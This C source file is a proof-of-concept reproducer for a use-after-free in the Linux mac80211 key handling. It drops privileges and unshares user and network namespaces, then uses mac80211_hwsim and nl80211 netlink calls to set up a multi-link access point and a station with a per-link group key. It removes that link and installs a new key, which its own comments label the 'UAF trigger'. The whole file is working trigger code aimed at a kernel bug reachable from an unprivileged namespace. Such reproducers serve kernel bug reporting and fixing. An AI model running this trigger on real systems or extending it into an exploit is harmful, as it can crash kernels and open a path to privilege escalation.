// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <grp.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/if_ether.h>

#include "nl80211.h"

#define HWSIM_GENL_NAME "MAC80211_HWSIM"

enum hwsim_commands {
	HWSIM_CMD_UNSPEC,
	HWSIM_CMD_REGISTER,
	HWSIM_CMD_FRAME,
	HWSIM_CMD_TX_INFO_FRAME,
	HWSIM_CMD_NEW_RADIO,
	HWSIM_CMD_DEL_RADIO,
	HWSIM_CMD_GET_RADIO,
};

enum hwsim_attrs {
	HWSIM_ATTR_UNSPEC,
	HWSIM_ATTR_ADDR_RECEIVER,
	HWSIM_ATTR_ADDR_TRANSMITTER,
	HWSIM_ATTR_FRAME,
	HWSIM_ATTR_FLAGS,
	HWSIM_ATTR_RX_RATE,
	HWSIM_ATTR_SIGNAL,
	HWSIM_ATTR_TX_INFO,
	HWSIM_ATTR_COOKIE,
	HWSIM_ATTR_CHANNELS,
	HWSIM_ATTR_RADIO_ID,
	HWSIM_ATTR_REG_HINT_ALPHA2,
	HWSIM_ATTR_REG_CUSTOM_REG,
	HWSIM_ATTR_REG_STRICT_REG,
	HWSIM_ATTR_SUPPORT_P2P_DEVICE,
	HWSIM_ATTR_USE_CHANCTX,
	HWSIM_ATTR_DESTROY_RADIO_ON_CLOSE,
	HWSIM_ATTR_RADIO_NAME,
	HWSIM_ATTR_NO_VIF,
	HWSIM_ATTR_FREQ,
	HWSIM_ATTR_PAD,
	HWSIM_ATTR_TX_INFO_FLAGS,
	HWSIM_ATTR_PERM_ADDR,
	HWSIM_ATTR_IFTYPE_SUPPORT,
	HWSIM_ATTR_CIPHER_SUPPORT,
	HWSIM_ATTR_MLO_SUPPORT,
};

#define WLAN_CIPHER_SUITE_CCMP 0x000FAC04

#define NLBUF (256 * 1024)

static unsigned int g_seq = 1;

struct msg {
	char buf[8192];
	size_t len;
};

static struct nlmsghdr *mh(struct msg *m) { return (struct nlmsghdr *)m->buf; }

static void msg_init(struct msg *m, unsigned short family, unsigned char cmd,
		     unsigned short flags)
{
	struct nlmsghdr *nh;
	struct genlmsghdr *gh;

	memset(m, 0, sizeof(*m));
	nh = mh(m);
	nh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	nh->nlmsg_type = family;
	nh->nlmsg_flags = NLM_F_REQUEST | flags;
	nh->nlmsg_seq = ++g_seq;
	nh->nlmsg_pid = 0;
	gh = (struct genlmsghdr *)NLMSG_DATA(nh);
	gh->cmd = cmd;
	gh->version = 0;
	m->len = nh->nlmsg_len;
}

static void msg_attr(struct msg *m, unsigned short type, const void *data,
		     unsigned short dlen)
{
	struct nlattr *a = (struct nlattr *)(m->buf + NLMSG_ALIGN(m->len));

	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + dlen;
	if (dlen)
		memcpy((char *)a + NLA_HDRLEN, data, dlen);
	m->len = NLMSG_ALIGN(m->len) + NLA_ALIGN(a->nla_len);
	mh(m)->nlmsg_len = m->len;
}

static void attr_u8(struct msg *m, unsigned short t, unsigned char v)
{ msg_attr(m, t, &v, 1); }
static void attr_u16(struct msg *m, unsigned short t, unsigned short v)
{ msg_attr(m, t, &v, 2); }
static void attr_u32(struct msg *m, unsigned short t, unsigned int v)
{ msg_attr(m, t, &v, 4); }
static void attr_flag(struct msg *m, unsigned short t)
{ msg_attr(m, t, NULL, 0); }

static int nl_open(void)
{
	struct sockaddr_nl sa;
	int fd, sz = NLBUF;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0) {
		perror("socket(NETLINK_GENERIC)");
		exit(1);
	}
	setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind netlink");
		exit(1);
	}
	return fd;
}

static char *g_rbuf;

static int nl_do(int fd, struct msg *m, const char *what)
{
	int n;
	unsigned int seq = mh(m)->nlmsg_seq;

	mh(m)->nlmsg_flags |= NLM_F_ACK;
	if (send(fd, m->buf, m->len, 0) < 0) {
		printf("[-] %s: send: %s\n", what, strerror(errno));
		return -errno;
	}

	for (;;) {
		struct nlmsghdr *nh;

		n = recv(fd, g_rbuf, NLBUF, 0);
		if (n < 0) {
			printf("[-] %s: recv: %s\n", what, strerror(errno));
			return -errno;
		}
		for (nh = (struct nlmsghdr *)g_rbuf; NLMSG_OK(nh, (unsigned)n);
		     nh = NLMSG_NEXT(nh, n)) {
			if (nh->nlmsg_seq != seq)
				continue;
			if (nh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = NLMSG_DATA(nh);

				if (e->error)
					printf("[-] %s -> %d (%s)\n", what,
					       e->error, strerror(-e->error));
				else
					printf("[+] %s -> ok\n", what);
				return e->error;
			}
			if (nh->nlmsg_type == NLMSG_DONE) {
				printf("[+] %s -> done\n", what);
				return 0;
			}
		}
	}
}

static void parse_attrs(struct nlmsghdr *nh, struct nlattr **tb, int maxtype)
{
	struct nlattr *a;
	int rem;

	memset(tb, 0, sizeof(struct nlattr *) * (maxtype + 1));
	a = (struct nlattr *)((char *)NLMSG_DATA(nh) + GENL_HDRLEN);
	rem = nh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
	for (; rem >= (int)sizeof(struct nlattr) && rem >= a->nla_len;
	     rem -= NLA_ALIGN(a->nla_len),
	     a = (struct nlattr *)((char *)a + NLA_ALIGN(a->nla_len))) {
		if (a->nla_type <= maxtype)
			tb[a->nla_type] = a;
	}
}

static unsigned short resolve_family(int fd, const char *name)
{
	struct msg m;
	struct nlattr *tb[CTRL_ATTR_MAX + 1];
	struct nlmsghdr *nh;
	unsigned int seq;
	int n;

	msg_init(&m, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 0);
	msg_attr(&m, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
	seq = mh(&m)->nlmsg_seq;
	if (send(fd, m.buf, m.len, 0) < 0)
		return 0;
	n = recv(fd, g_rbuf, NLBUF, 0);
	if (n < 0)
		return 0;
	for (nh = (struct nlmsghdr *)g_rbuf; NLMSG_OK(nh, (unsigned)n);
	     nh = NLMSG_NEXT(nh, n)) {
		if (nh->nlmsg_seq != seq)
			continue;
		if (nh->nlmsg_type == NLMSG_ERROR)
			return 0;
		parse_attrs(nh, tb, CTRL_ATTR_MAX);
		if (tb[CTRL_ATTR_FAMILY_ID])
			return *(unsigned short *)((char *)tb[CTRL_ATTR_FAMILY_ID] +
						   NLA_HDRLEN);
	}
	return 0;
}

static int nl80211;
static int fd80211;

static int g_wiphy = -1;
static int g_ifindex = -1;
static char g_ifname[IF_NAMESIZE];

#define A_MAX NL80211_ATTR_MAX

static void find_wiphy(const char *want)
{
	struct msg m;
	struct nlmsghdr *nh;
	unsigned int seq;
	int n, done = 0;

	msg_init(&m, nl80211, NL80211_CMD_GET_WIPHY, NLM_F_DUMP);
	attr_flag(&m, NL80211_ATTR_SPLIT_WIPHY_DUMP);
	seq = mh(&m)->nlmsg_seq;
	send(fd80211, m.buf, m.len, 0);

	while (!done) {
		n = recv(fd80211, g_rbuf, NLBUF, 0);
		if (n <= 0)
			break;
		for (nh = (struct nlmsghdr *)g_rbuf; NLMSG_OK(nh, (unsigned)n);
		     nh = NLMSG_NEXT(nh, n)) {
			struct nlattr *tb[A_MAX + 1];

			if (nh->nlmsg_seq != seq)
				continue;
			if (nh->nlmsg_type == NLMSG_DONE ||
			    nh->nlmsg_type == NLMSG_ERROR) {
				done = 1;
				break;
			}
			parse_attrs(nh, tb, A_MAX);
			if (!tb[NL80211_ATTR_WIPHY] || !tb[NL80211_ATTR_WIPHY_NAME])
				continue;
			if (!strcmp((char *)tb[NL80211_ATTR_WIPHY_NAME] + NLA_HDRLEN,
				    want))
				g_wiphy = *(int *)((char *)tb[NL80211_ATTR_WIPHY] +
						   NLA_HDRLEN);
		}
	}
}

static void find_iface(void)
{
	struct msg m;
	struct nlmsghdr *nh;
	unsigned int seq;
	int n, done = 0;

	msg_init(&m, nl80211, NL80211_CMD_GET_INTERFACE, NLM_F_DUMP);
	seq = mh(&m)->nlmsg_seq;
	send(fd80211, m.buf, m.len, 0);

	while (!done) {
		n = recv(fd80211, g_rbuf, NLBUF, 0);
		if (n <= 0)
			break;
		for (nh = (struct nlmsghdr *)g_rbuf; NLMSG_OK(nh, (unsigned)n);
		     nh = NLMSG_NEXT(nh, n)) {
			struct nlattr *tb[A_MAX + 1];
			int w;

			if (nh->nlmsg_seq != seq)
				continue;
			if (nh->nlmsg_type == NLMSG_DONE ||
			    nh->nlmsg_type == NLMSG_ERROR) {
				done = 1;
				break;
			}
			parse_attrs(nh, tb, A_MAX);
			if (!tb[NL80211_ATTR_WIPHY] || !tb[NL80211_ATTR_IFINDEX])
				continue;
			w = *(int *)((char *)tb[NL80211_ATTR_WIPHY] + NLA_HDRLEN);
			if (w != g_wiphy)
				continue;
			g_ifindex = *(int *)((char *)tb[NL80211_ATTR_IFINDEX] +
					     NLA_HDRLEN);
			if (tb[NL80211_ATTR_IFNAME])
				snprintf(g_ifname, sizeof(g_ifname), "%s",
					 (char *)tb[NL80211_ATTR_IFNAME] + NLA_HDRLEN);
		}
	}
}

static int set_if_up(const char *name, int up)
{
	struct ifreq ifr;
	int s, ret;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0)
		return -1;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, IFNAMSIZ, "%s", name);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) {
		close(s);
		return -1;
	}
	if (up)
		ifr.ifr_flags |= IFF_UP;
	else
		ifr.ifr_flags &= ~IFF_UP;
	ret = ioctl(s, SIOCSIFFLAGS, &ifr);
	close(s);
	printf("[*] %s %s -> %d\n", name, up ? "UP" : "DOWN", ret);
	return ret;
}

static unsigned char bcn_head[64];
static int bcn_head_len;

static void build_beacon(const unsigned char *bssid, const char *ssid)
{
	unsigned char *p = bcn_head;
	int slen = strlen(ssid);

	memset(bcn_head, 0, sizeof(bcn_head));
	p[0] = 0x80;
	p[1] = 0x00;
	p[2] = p[3] = 0;
	memset(p + 4, 0xff, 6);
	memcpy(p + 10, bssid, 6);
	memcpy(p + 16, bssid, 6);
	p[22] = p[23] = 0;

	p[32] = 100; p[33] = 0;
	p[34] = 0x01; p[35] = 0x00;

	p[36] = 0;
	p[37] = slen;
	memcpy(p + 38, ssid, slen);
	bcn_head_len = 38 + slen;
}

static const unsigned char link0_addr[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x00 };
static const unsigned char link1_addr[6] = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x01 };
static const unsigned char sta_mld[6]    = { 0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0xff };
static const unsigned char sta_l0[6]     = { 0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0x00 };
static const unsigned char sta_l1[6]     = { 0x02, 0xaa, 0xbb, 0xcc, 0xdd, 0x01 };

static const unsigned char rates[] = { 0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c };
static const unsigned char keydata[16] = {
	0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15
};

static int start_ap(int link_id, const unsigned char *bssid, unsigned int freq)
{
	struct msg m;
	char what[64];

	build_beacon(bssid, "mlopoc");
	msg_init(&m, nl80211, NL80211_CMD_START_AP, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, link_id);
	msg_attr(&m, NL80211_ATTR_BEACON_HEAD, bcn_head, bcn_head_len);
	attr_u32(&m, NL80211_ATTR_BEACON_INTERVAL, 100);
	attr_u32(&m, NL80211_ATTR_DTIM_PERIOD, 2);
	msg_attr(&m, NL80211_ATTR_SSID, "mlopoc", 6);
	attr_u32(&m, NL80211_ATTR_HIDDEN_SSID, NL80211_HIDDEN_SSID_NOT_IN_USE);
	attr_u32(&m, NL80211_ATTR_AUTH_TYPE, NL80211_AUTHTYPE_OPEN_SYSTEM);
	attr_u32(&m, NL80211_ATTR_WIPHY_FREQ, freq);
	attr_u32(&m, NL80211_ATTR_CHANNEL_WIDTH, NL80211_CHAN_WIDTH_20_NOHT);
	snprintf(what, sizeof(what), "START_AP link %d @ %u", link_id, freq);
	return nl_do(fd80211, &m, what);
}

static void wr(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0) {
		printf("[-] open %s: %s\n", path, strerror(errno));
		return;
	}
	if (write(fd, val, strlen(val)) < 0)
		printf("[-] write %s: %s\n", path, strerror(errno));
	close(fd);
}

static void drop_privs(void)
{
	if (getuid() == 0) {
		setgroups(0, NULL);
		if (setgid(65534) || setuid(65534)) {
			printf("[-] setuid failed: %s\n", strerror(errno));
			return;
		}
	}
	printf("[*] real uid before unshare = %d\n", getuid());
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		printf("[-] unshare(NEWUSER|NEWNET): %s\n", strerror(errno));
		return;
	}
	wr("/proc/self/setgroups", "deny");
	wr("/proc/self/uid_map", "0 65534 1");
	wr("/proc/self/gid_map", "0 65534 1");
	printf("[*] in user+net ns, uid=%d (host uid is 65534)\n", getuid());
}

int main(int argc, char **argv)
{
	struct msg m;
	int fdhw;
	unsigned short hwsim;
	int r;

	setvbuf(stdout, NULL, _IONBF, 0);
	g_rbuf = malloc(NLBUF);

	printf("=== mac80211 key.c -ENOLINK orphan-key PoC ===\n");

	drop_privs();

	fdhw = nl_open();
	fd80211 = nl_open();

	hwsim = resolve_family(fdhw, HWSIM_GENL_NAME);
	nl80211 = resolve_family(fd80211, "nl80211");
	printf("[*] family: MAC80211_HWSIM=%u nl80211=%d\n", hwsim, nl80211);
	if (!hwsim || !nl80211) {
		printf("[-] missing genl family\n");
		return 1;
	}

	msg_init(&m, hwsim, HWSIM_CMD_NEW_RADIO, 0);
	attr_u32(&m, HWSIM_ATTR_CHANNELS, 4);
	attr_flag(&m, HWSIM_ATTR_MLO_SUPPORT);
	attr_u32(&m, HWSIM_ATTR_REG_CUSTOM_REG, 2);
	msg_attr(&m, HWSIM_ATTR_RADIO_NAME, "hwmlo0", 7);
	nl_do(fdhw, &m, "HWSIM_CMD_NEW_RADIO");

	find_wiphy("hwmlo0");
	printf("[*] wiphy index = %d\n", g_wiphy);
	if (g_wiphy < 0) {
		printf("[-] radio not found\n");
		return 1;
	}
	find_iface();
	printf("[*] ifindex = %d name = %s\n", g_ifindex, g_ifname);
	if (g_ifindex < 0)
		return 1;

	set_if_up(g_ifname, 0);
	msg_init(&m, nl80211, NL80211_CMD_SET_INTERFACE, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u32(&m, NL80211_ATTR_IFTYPE, NL80211_IFTYPE_AP);
	nl_do(fd80211, &m, "SET_INTERFACE AP");
	set_if_up(g_ifname, 1);

	msg_init(&m, nl80211, NL80211_CMD_ADD_LINK, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 0);
	msg_attr(&m, NL80211_ATTR_MAC, link0_addr, 6);
	nl_do(fd80211, &m, "ADD_LINK 0");

	msg_init(&m, nl80211, NL80211_CMD_ADD_LINK, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 1);
	msg_attr(&m, NL80211_ATTR_MAC, link1_addr, 6);
	nl_do(fd80211, &m, "ADD_LINK 1");

	start_ap(0, link0_addr, 2412);
	start_ap(1, link1_addr, 5180);

	msg_init(&m, nl80211, NL80211_CMD_NEW_STATION, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	msg_attr(&m, NL80211_ATTR_MAC, sta_l0, 6);
	msg_attr(&m, NL80211_ATTR_MLD_ADDR, sta_mld, 6);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 0);
	attr_u16(&m, NL80211_ATTR_STA_AID, 1);
	attr_u16(&m, NL80211_ATTR_STA_LISTEN_INTERVAL, 1);
	msg_attr(&m, NL80211_ATTR_STA_SUPPORTED_RATES, rates, sizeof(rates));
	r = nl_do(fd80211, &m, "NEW_STATION (MLD, link 0)");
	if (r)
		printf("[!] station creation failed, later steps will fail\n");

	msg_init(&m, nl80211, NL80211_CMD_ADD_LINK_STA, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	msg_attr(&m, NL80211_ATTR_MLD_ADDR, sta_mld, 6);
	msg_attr(&m, NL80211_ATTR_MAC, sta_l1, 6);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 1);
	msg_attr(&m, NL80211_ATTR_STA_SUPPORTED_RATES, rates, sizeof(rates));
	nl_do(fd80211, &m, "ADD_LINK_STA link 1");

	msg_init(&m, nl80211, NL80211_CMD_NEW_KEY, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	msg_attr(&m, NL80211_ATTR_MAC, sta_mld, 6);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 1);
	attr_u8(&m, NL80211_ATTR_KEY_IDX, 1);
	attr_u32(&m, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_CCMP);
	attr_u32(&m, NL80211_ATTR_KEY_TYPE, NL80211_KEYTYPE_GROUP);
	msg_attr(&m, NL80211_ATTR_KEY_DATA, keydata, sizeof(keydata));
	r = nl_do(fd80211, &m, "NEW_KEY (per-link-STA GTK, link 1)");
	if (r)
		printf("[!] per-link-STA GTK install failed\n");

	msg_init(&m, nl80211, NL80211_CMD_REMOVE_LINK_STA, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	msg_attr(&m, NL80211_ATTR_MLD_ADDR, sta_mld, 6);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 1);
	nl_do(fd80211, &m, "REMOVE_LINK_STA link 1");

	msg_init(&m, nl80211, NL80211_CMD_REMOVE_LINK, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 1);
	nl_do(fd80211, &m, "REMOVE_LINK 1  <-- frees key still on key_list");

	printf("[*] triggering: NEW_KEY on link 0 -> list_add_tail_rcu()\n");
	msg_init(&m, nl80211, NL80211_CMD_NEW_KEY, 0);
	attr_u32(&m, NL80211_ATTR_IFINDEX, g_ifindex);
	attr_u8(&m, NL80211_ATTR_MLO_LINK_ID, 0);
	attr_u8(&m, NL80211_ATTR_KEY_IDX, 2);
	attr_u32(&m, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_CCMP);
	attr_u32(&m, NL80211_ATTR_KEY_TYPE, NL80211_KEYTYPE_GROUP);
	msg_attr(&m, NL80211_ATTR_KEY_DATA, keydata, sizeof(keydata));
	nl_do(fd80211, &m, "NEW_KEY (group, link 0) -- UAF trigger");

	printf("[*] fallback: bringing the interface down\n");
	set_if_up(g_ifname, 0);

	printf("[*] done (no crash?)\n");
	return 0;
}
